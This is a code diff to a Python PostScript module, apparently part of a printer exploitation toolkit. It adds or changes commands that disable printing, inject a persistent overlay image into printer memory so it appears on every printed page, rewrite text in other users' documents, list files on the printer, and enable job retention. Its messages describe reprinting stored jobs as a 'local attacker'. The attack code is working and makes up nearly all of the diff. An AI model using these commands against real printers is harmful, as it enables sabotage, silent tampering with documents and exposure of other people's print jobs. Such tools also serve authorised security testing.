@@ -46,7 +46,7 @@ class postscript(printer):
     self.error = None
     msg = item(re.findall(c.PS_ERROR, str_recv))
     if msg: # real postscript command errors
-      output().errmsg("PostScript Error", msg.strip())
+      output().errmsg("PostScript Error", msg)
       self.error = msg
       str_recv = ""
     else: # printer errors or status messages
@@ -120,11 +120,11 @@ class postscript(printer):
     # standard conform ps interpreters respond with file size + timestamps
     if len(meta) == 4:
       # timestamps however are often mixed up…
-      timestamps = [int(meta[0]), int(meta[1])]
+      timestamps = [conv().int(meta[0]), conv().int(meta[1])]
       otime = conv().lsdate(min(timestamps)) # created (may also be ctime)
       mtime = conv().lsdate(max(timestamps)) # last referenced for writing
-      size  = meta[2]                        # bytes (file/directory size)
-      pages = meta[3]                        # pages (ain't really useful)
+      size  = str(conv().int(meta[2]))       # bytes (file/directory size)
+      pages = str(conv().int(meta[3]))       # pages (ain't really useful)
       return (size, otime, mtime) if ls else int(size)
     # broken interpreters return true only; can also mean: directory
     elif item(meta) == 'true': return c.FILE_EXISTS
@@ -140,13 +140,14 @@ class postscript(printer):
     if r: path = self.rpath(path)
     path = self.escape(path + self.get_sep(path))
     vol = "" if self.vol else "%*%" # search any volume if none specified
-    # also lists 'hidden' .dotfiles; special treatment for brother devices
+    # also lists hidden .dotfiles + special treatment for brother devices
     str_recv = self.find(vol + path + "**") or self.find(vol + path + "*")
     list = {name for name in str_recv.splitlines()}
     return sorted(list)
 
   def find(self, path):
-    str_send = '/str 256 string def (' + path + ') '\
+    str_send = '{false statusdict /setfilenameextend get exec} stopped\n'\
+               '/str 256 string def (' + path + ') '\
                '{print (\\n) print} str filenameforall'
     return self.timeoutcmd(str_send, self.timeout * 2, False)
 
@@ -444,10 +445,19 @@ class postscript(printer):
 
   # ------------------------[ disable ]---------------------------------
   def do_disable(self, arg):
-    "Disable printing functionality."
-    self.disable = not self.disable
-    output().chitchat(("Dis" if self.disable else "En") + "abling printing functionality")
-    self.globalcmd('/showpage {} def' if self.disable else "userdict /showpage undef")
+    output().psonly()
+    before = 'true' in self.globalcmd('userdict /showpage known dup ==\n'
+                                      '{userdict /showpage undef}\n'
+                                      '{/showpage {} def} ifelse')
+    after = 'true' in self.cmd('userdict /showpage known ==')
+    if before == after: output().info("Not available") # no change
+    elif before: output().info("Printing is now enabled")
+    elif after: output().info("Printing is now disabled")
+
+  # define alias but do not show alias in help
+  do_enable = do_disable
+  def help_disable(self):
+    print("Disable printing functionality.")
 
   # ------------------------[ destroy ]---------------------------------
   def do_destroy(self, arg):
@@ -490,22 +500,31 @@ class postscript(printer):
 
   # ====================================================================
 
-  # ------------------------[ overlay <file.eps> ]----------------------
+  # ------------------------[ overlay <file> ]--------------------------
   def do_overlay(self, arg):
-    "Put overlay eps file on all hard copies:  overlay <file.eps>"
-    if not arg:
-      arg = raw_input('File: ')
-    data = file().read(arg)
+    "Put overlay image on all hard copies:  overlay <file>"
+    if not arg: arg = raw_input('File: ')
+    if arg.endswith('ps'): data = file().read(arg) # already ps/eps file
+    else:
+      self.chitchat("For best results use a file from the overlays/ directory")
+      data = self.convert(arg, 'eps') # try to convert other file types
     if data: self.overlay(data)
 
   # define alias
   complete_overlay = printer.complete_lfiles # files or directories
 
   def overlay(self, data):
-    str_send = 'currentdict /showpage_real known false eq\n'\
-               '{/showpage_real systemdict /showpage get def} if\n'\
-               '/showpage {save /showpage {} bind def\n'\
-               + data + '\nrestore showpage_real} def'
+    output().psonly()
+    size = conv().filesize(len(data)).strip()
+    self.chitchat("Injecting overlay data (" + size + ") into printer memory")
+    str_send = '{overlay closefile} stopped % free memory\n'\
+               '/overlay systemdict /currentfile get exec\n'\
+               + str(len(data)) + ' () /SubFileDecode filter\n'\
+               '/ReusableStreamDecode filter\n' + data + '\n'\
+               'def % --------------------------------------\n'\
+               '/showpage {save /showpage {} def overlay dup\n'\
+               '0 setfileposition cvx exec restore systemdict\n'\
+               '/showpage get exec} def'
     self.globalcmd(str_send)
 
   # ------------------------[ cross <text> <font> ]---------------------
@@ -541,6 +560,7 @@ class postscript(printer):
     "Replace string in documents to be printed:  replace <old> <new>"
     arg = re.split("\s+", arg, 1)
     if len(arg) > 1:
+      output().psonly()
       oldstr, newstr = self.escape(arg[0]), self.escape(arg[1])
       self.globalcmd('/strcat {exch dup length 2 index length add string dup\n'
                       'dup 4 2 roll copy length 4 -1 roll putinterval} def\n'
@@ -588,6 +608,7 @@ class postscript(printer):
       name = path + '.test'
       self.onecmd("touch " + name)
       storage = self.file_exists(name) != c.NONEXISTENT
+      storage = False
       output().chitchat("Storage strategy: " + ("named" if storage else "virtual") + " file")
       output().chitchat("Content strategy: currentfile")     # currently the only strategy we have
       output().chitchat("Hooking strategy: CUPS (ps2write)") # currently the only strategy we have
@@ -781,6 +802,7 @@ class postscript(printer):
   # ------------------------[ hold ]------------------------------------
   def do_hold(self, arg):
     "Enable job retention."
+    output().psonly()
     str_send = 'currentpagedevice (CollateDetails) get (Hold) get 1 ne\n'\
                '{/retention 1 def}{/retention 0 def} ifelse\n'\
                '<< /Collate true /CollateDetails\n'\
@@ -789,6 +811,10 @@ class postscript(printer):
                'currentpagedevice (CollateDetails) get (Hold) get 1 ne\n'\
                '{(disabled.) print}{(enabled.) print} ifelse'
     output().info(self.globalcmd(str_send))
+    self.chitchat("On most devices, jobs can only be reprinted by a local attacker via the")
+    self.chitchat("printer's control panel. Stored jobs are sometimes accessible by PS/PJL")
+    self.chitchat("file system access or via the embedded web server. If your printer does")
+    self.chitchat("not support holding jobs try the more generic 'capture' command instead")
     #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
     '''
     **************************** HP/KYOCERA ****************************
@@ -802,6 +828,9 @@ class postscript(printer):
     **************************** CANON *********************************
     << /CNJobExecMode store >> setpagedevice
     << /CNJobExecMode hold  >> setpagedevice
+
+    **************************** BROTHER *******************************
+    << /BRHold 2 /BRHoldType 0 >> setpagedevice
 
     **************************** XEROX #1 ******************************
     userdict /XJXsetraster known { 1 XJXsetraster } if
@@ -1051,6 +1080,7 @@ class postscript(printer):
     if arg in self.options_config.keys():
       key = self.options_config[arg]
       if arg == 'copies' and not val: return self.help_config()
+      output().psonly()
       val = val or 'currentpagedevice /' + key + ' get not'
       output().info(self.globalcmd(
         'currentpagedevice /' + key + ' known\n'
